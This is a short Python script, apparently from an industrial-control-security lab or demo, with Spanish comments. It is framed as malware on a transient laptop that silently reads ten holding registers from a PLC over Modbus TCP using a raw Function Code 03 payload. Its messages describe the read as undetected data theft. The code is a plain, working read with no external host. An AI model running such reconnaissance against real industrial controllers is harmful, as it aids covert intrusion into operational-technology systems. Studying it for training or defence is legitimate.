import socket
import time

IP_PLC = '192.168.70.129'
PUERTO_MODBUS = 502

print("[*] Transient Cyber Asset (Portátil) conectado a la red OT...")
print("[*] Malware interno iniciando reconocimiento silencioso (T0864)...")

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(3)
    
    # 1. Conexión automatizada (Genera el SYN)
    s.connect((IP_PLC, PUERTO_MODBUS))
    
    # 2. PAYLOAD ICS: Leer 10 registros de memoria (FC 03)
    # Trans ID: 0001, Prot: 0000, Len: 0006, Unit: 01, Func: 03, Reg: 0000, Qty: 000A
    payload = b'\x00\x01\x00\x00\x00\x06\x01\x03\x00\x00\x00\x0A'
    
    print("[-] Extrayendo datos de memoria del PLC (Function Code 03)...")
    s.send(payload)
    
    # Recibir los datos exfiltrados
    respuesta = s.recv(1024)
    print(f"[+] ¡Datos extraídos con éxito!: {respuesta.hex()}")
    time.sleep(1)
    
    # 3. Cierre de conexión (FIN/ACK)
    s.close()
    print("[*] Robo de información completado. El ingeniero no ha notado nada.")

except Exception as e:
    print(f"[!] Error: {e}")

